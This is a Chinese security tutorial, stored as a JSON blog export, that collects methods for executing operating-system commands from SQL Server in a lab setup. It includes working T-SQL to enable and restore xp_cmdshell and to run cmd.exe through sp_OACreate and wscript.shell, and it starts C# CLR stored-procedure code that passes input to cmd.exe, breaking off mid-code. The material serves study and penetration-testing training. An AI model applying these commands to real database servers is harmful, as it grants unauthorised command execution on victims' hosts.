{"title":"SQL Server命令执行方式汇总","uid":"ad74bb09d7e0c77ac4f85f8bb423fecf","slug":"SQL Server命令执行方式汇总","date":"2023-02-11T15:51:20.000Z","updated":"2023-03-14T07:46:32.000Z","comments":true,"path":"api/articles/SQL Server命令执行方式汇总.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141545601.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>学习内网基础时发现对Mssql的命令执行不太熟悉，因此进行了简单总结，希望对正在学习此类知识的师傅有所帮助。</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>本文环境如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">服务器：windows2008\n数据库：sqlserver2008<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>下载链接如下（复制后打开迅雷即可自动加载）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ed2k<span class=\"token punctuation\">:</span><span class=\"token comment\">//|file|cn_windows_server_2008_r2_hpc_x64_dvd_552764.iso|2959194112|1941C1937261AB4F6F9A28F86FE3DAC0|/</span>\ned2k<span class=\"token punctuation\">:</span><span class=\"token comment\">//|file|cn_sql_server_2008_r2_developer_x86_x64_ia64_dvd_522724.iso|4662884352|E436F05BCB0165FDF7E5E61862AB6BE1|/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>首先安装windows2008，然后将sqlserver的镜像导入，导入方式可采用添加<code>CD/DVD</code>来实现，也可直接将iso文件拖入<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546520.png\" alt=\"在这里插入图片描述\"><br>而后打开进行安装即可，具体教程可参考<code>macchiato</code>大师傅的这篇文章<a href=\"https://macchiato.ink/web/web_security/mssql_injection_setup/#MSSQL%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\">MSSQL注入环境搭建</a><br>安装完成后Navicat进行连接<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546515.png\" alt=\"在这里插入图片描述\"><br>此时就可以打开数据库，在其中执行命令查询来进行测试了。</p>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"扩展存储过程（xp-cmdshell）\"><a href=\"#扩展存储过程（xp-cmdshell）\" class=\"headerlink\" title=\"扩展存储过程（xp_cmdshell）\"></a>扩展存储过程（xp_cmdshell）</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>什么是<code>xp_cmdshell</code>呢，这里的话简单介绍一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>其作用就是执行命令，<code>xp_cmdshell</code>可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。</p>\n<p>补充</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>以xp_开头，使用外部程序语言编写的存储过程为扩展存储过程。如：xp_cmdshell</p></blockquote>\n<h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1 、SQL Server数据库没有被降权；<br>2、 sa用户或其他具有dba权限的账户。</p></blockquote>\n<h3 id=\"具体利用\"><a href=\"#具体利用\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>直接使用指令的话应该执行这条语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec master<span class=\"token operator\">.</span><span class=\"token operator\">.</span>xp_cmdshell <span class=\"token string double-quoted-string\">\"whoami\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但此时执行的话是执行不了的，这是因为他默认是关闭的，我们需要首先开启<code>xp_cmdshell</code>，执行一段语句即可，具体指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">EXEC</span> sp_configure <span class=\"token string single-quoted-string\">'show advanced options'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token constant\">RECONFIGURE</span><span class=\"token punctuation\">;</span><span class=\"token constant\">EXEC</span> sp_configure <span class=\"token string single-quoted-string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token constant\">RECONFIGURE</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来再去执行指令即可出现回显。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546508.png\" alt=\"在这里插入图片描述\"></p>\n<p>但也存在一种情况，即<code>xp_cmdshell</code>被删除的情况，此时，我们可以通过以下语句来进行恢复</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Exec master<span class=\"token operator\">.</span>dbo<span class=\"token operator\">.</span>sp_addextendedproc <span class=\"token string single-quoted-string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'D:\\\\xplog70.dll'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"系统存储过程-sp-OACreate\"><a href=\"#系统存储过程-sp-OACreate\" class=\"headerlink\" title=\"系统存储过程(sp_OACreate)\"></a>系统存储过程(sp_OACreate)</h2><h3 id=\"概念-1\"><a href=\"#概念-1\" class=\"headerlink\" title=\"概念\"></a>概念</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>sp_OACreate 创建 OLE 对象实例。<br>–&gt;第一个参数为 OLE 对象的程序标识符（ProgID）或类标识符（CLSID）。<br>–&gt;第二个参数为返回的对象令牌，必须是数据类型为 int 的局部变量，在后面的方法中都要用到对象令牌。输出参数，必须加 OUT 或 OUTPUT。</p></blockquote>\n<p>当<code>xp_cmdshell</code>无法使用时，我们也可以通过<code>sp_OACreate</code>来创建<code>OLE对象实例</code>，然后利用<code>sp_oamethod</code>(<code>sp_oamethod</code>是调用一个 <code>OLE 对象</code>的方法)达到一个执行命令的效果。</p>\n<p>补充</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>以sp_开头，进行系统的设定为系统存储过程。如：sp_oacreate、sp_oamethod</p></blockquote>\n<h3 id=\"利用条件-1\"><a href=\"#利用条件-1\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><p>同上，即</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1 、SQL Server数据库没有被降权；<br>2、 sa用户或其他具有dba权限的账户。</p></blockquote>\n<h3 id=\"具体利用-1\"><a href=\"#具体利用-1\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>首先判断一下<code>sp_OACreate</code>是否存在</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> from master<span class=\"token operator\">.</span>dbo<span class=\"token operator\">.</span>sysobjects where xtype<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'x'</span> <span class=\"token keyword\">and</span> name<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SP_OACREATE'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546523.png\" alt=\"在这里插入图片描述\"><br>回显<code>1</code>即代表存在，接下来就可以去启用它而后执行命令。<br>这里采用<code>EXEC</code>来开启它，具体指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">EXEC</span> sp_configure <span class=\"token string single-quoted-string\">'show advanced options'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>   \n<span class=\"token constant\">RECONFIGURE</span> <span class=\"token constant\">WITH</span> <span class=\"token constant\">OVERRIDE</span><span class=\"token punctuation\">;</span>   \n<span class=\"token constant\">EXEC</span> sp_configure <span class=\"token string single-quoted-string\">'Ole Automation Procedures'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>   \n<span class=\"token constant\">RECONFIGURE</span> <span class=\"token constant\">WITH</span> <span class=\"token constant\">OVERRIDE</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>开启后我们就可以执行命令了，因为这个命令是无回显的，所以我们需要将结果导出至一个文本中，具体指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">declare</span> @shell <span class=\"token keyword type-declaration\">int</span> exec sp_oacreate <span class=\"token string single-quoted-string\">'wscript.shell'</span><span class=\"token punctuation\">,</span>@shell output exec sp_oamethod @shell<span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">,</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'c:\\windows\\system32\\cmd.exe /c whoami >c:\\\\1.txt'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546500.png\" alt=\"在这里插入图片描述\"><br>可以看到此时成功执行命令并看到了查询结果。</p>\n<h2 id=\"本地存储过程-CLR）\"><a href=\"#本地存储过程-CLR）\" class=\"headerlink\" title=\"本地存储过程(CLR）\"></a>本地存储过程(CLR）</h2><h3 id=\"概念-2\"><a href=\"#概念-2\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>CLR，即<code>Common Language Infrastructure</code>，其含义为公共语言基础结构，它用来支持不同编程语言。sql server集成了该组件，可以通过sql server编写CLR来执行系统命令。</p>\n<p>补充</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本地存储过程指用户创建的自定义存储过程。如：CLR</p></blockquote>\n<h3 id=\"利用条件-2\"><a href=\"#利用条件-2\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、在SQL Server上能启用CLR并可以创建自定义存储过程<br>2、SQL Server当前账号具有执行命令/代码所需要的权限</p></blockquote>\n<h3 id=\"CLR编写\"><a href=\"#CLR编写\" class=\"headerlink\" title=\"CLR编写\"></a>CLR编写</h3><p>这里先膜拜一下<code>Y4er</code>大师傅，编写过程参考自这位大师傅。<br>这里使用的是<code>visual studio 2022</code>，在创建新项目中选择<code>SQL Server</code>数据库项目<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546533.png\" alt=\"在这里插入图片描述\"><br>而后点击下一步，接下来随便填写一下，创建项目即可。<br>而后右键项目点击属性<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546856.png\" alt=\"在这里插入图片描述\"><br>接下来选择目标平台并创建脚本<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546866.png\" alt=\"在这里插入图片描述\"><br>接下来点击左侧的<code>SQLCLR</code>，修改目标框架为3.5版本，修改权限级别为<code>UNSAFE</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546885.png\" alt=\"在这里插入图片描述\"><br>保存后再右键右边的添加，选择存储过程<br><img src=\"https://img-blog.csdnimg.cn/6347a119d61f4d809abbc871d45cd0b1.png\" alt=\"在这里插入图片描述\"><br>而后选择<code>SQL CLR C# 存储过程</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546927.png\" alt=\"在这里插入图片描述\"><br>而后写入如下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">using System<span class=\"token punctuation\">;</span>\nusing System<span class=\"token operator\">.</span>Data<span class=\"token punctuation\">;</span>\nusing System<span class=\"token operator\">.</span>Data<span class=\"token operator\">.</span>SqlClient<span class=\"token punctuation\">;</span>\nusing System<span class=\"token operator\">.</span>Data<span class=\"token operator\">.</span>SqlTypes<span class=\"token punctuation\">;</span>\nusing System<span class=\"token operator\">.</span>Diagnostics<span class=\"token punctuation\">;</span>\nusing System<span class=\"token operator\">.</span>Text<span class=\"token punctuation\">;</span>\nusing Microsoft<span class=\"token operator\">.</span>SqlServer<span class=\"token operator\">.</span>Server<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> partial <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">StoredProcedures</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">[</span>Microsoft<span class=\"token operator\">.</span>SqlServer<span class=\"token operator\">.</span>Server<span class=\"token operator\">.</span>SqlProcedure<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword type-declaration\">void</span> <span class=\"token function\">ExecCommand</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">string</span> cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 在此处放置代码</span>\n        SqlContext<span class=\"token operator\">.</span>Pipe<span class=\"token operator\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Command is running, please wait.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        SqlContext<span class=\"token operator\">.</span>Pipe<span class=\"token operator\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span><span class=\"token function\">RunCommand</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd.exe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\" /c \"</span> <span class=\"token operator\">+</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 